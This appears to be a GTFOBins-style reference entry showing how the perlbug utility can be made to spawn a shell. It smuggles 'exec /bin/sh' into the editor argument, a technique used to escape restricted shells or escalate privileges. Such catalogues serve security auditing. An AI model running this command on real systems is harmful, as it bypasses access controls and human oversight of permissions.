title: perlbug
html:
perlbug

Shell

This requires to press `Enter` serveral times before the shell is spawn.

perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
excerpt: perlbug Shell This requires to press `Enter` serveral times before the shell is spawn. perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
